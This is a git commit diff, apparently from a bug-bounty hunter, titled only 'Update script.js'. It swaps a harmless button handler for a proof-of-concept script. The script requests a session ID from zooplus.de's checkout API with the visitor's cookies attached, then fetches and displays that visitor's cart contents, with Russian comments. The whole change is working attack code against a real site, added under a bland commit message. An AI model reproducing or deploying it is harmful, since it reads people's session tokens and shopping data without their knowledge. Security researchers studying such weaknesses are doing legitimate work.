7001da516a23c1fb5780b62b5b718c59a31c9d8c
hacker51-rgb <hackerhackerone51@gmail.com>
2025-04-12 00:29:47 +0300

    Update script.js

--- script.js
+++ script.js
@@ -1,3 +1,28 @@
-function changeText() {
-    document.getElementById("text").innerText = "You clicked the button!";
-}
+<script>
+fetch("https://www.zooplus.de/checkout/api/shop-api/v1/sid", {
+  credentials: 'include'
+})
+.then(res => res.text())
+.then(sid => {
+  console.log("SID:", sid);
+  
+  // Можно вставить SID на страницу (для теста)
+  document.body.innerHTML += "<p><strong>SID:</strong> " + sid + "</p>";
+
+  // Запрашиваем корзину
+  fetch("https://www.zooplus.de/checkout/api/cart-api/v1/cart/" + sid, {
+    credentials: 'include'
+  })
+  .then(r => r.json())
+  .then(data => {
+    console.log("Cart Data:", data);
+    document.body.innerHTML += "<h2>Корзина:</h2><pre>" + JSON.stringify(data, null, 2) + "</pre>";
+  })
+  .catch(err => {
+    console.error("Ошибка при получении корзины:", err);
+  });
+})
+.catch(err => {
+  console.error("Ошибка при получении SID:", err);
+});
+</script>
